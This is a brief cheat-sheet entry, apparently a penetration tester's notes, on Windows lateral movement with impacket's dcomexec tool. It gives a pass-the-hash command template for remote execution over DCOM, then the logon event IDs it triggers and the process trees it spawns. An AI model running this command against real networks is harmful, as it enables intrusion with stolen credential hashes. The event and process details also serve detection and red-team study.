### source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/dcomexec.py  

### lateral movement using DCOM endpoints (example MMC20.Application, ShellWindows, ShellBrowserWindow)
```
impacket-dcomexec -hashes :<ntlmHash> <domain>/<user>@<rhost>
```

### opsec considerations - Windows Security Log Event IDs
```
-Logon (4624) -> multiple
-Special Logon (4672) -> multiple
```

### running processes
```
cmd.exe
└── Conhost.exe
mmc.exe
└── cmd.exe
    └── Conhost.exe
```

